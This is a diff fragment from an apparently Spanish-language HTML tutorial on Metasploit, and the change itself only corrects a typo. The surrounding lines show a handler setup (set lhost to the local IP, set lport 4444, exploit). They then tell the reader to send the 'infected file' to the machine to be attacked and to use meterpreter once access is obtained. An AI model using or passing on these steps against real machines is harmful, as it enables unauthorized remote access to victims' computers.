@@ -21,7 +21,7 @@ set lhost <ip_maquina_local> <br />
 set lport 4444 <br />
 exploit <br /> 
 <br />
-Ir a la carpeta donde se ha creado en archivo infectado <br />
+Ir a la carpeta donde se ha creado el archivo infectado <br />
 Enviar archivo a la máquina que se desea atacar <br />
 cuando se tenga el acceso a la máquina atacada se podrá usar todas las herramientas que tiene meterpreter<br />
 <br />
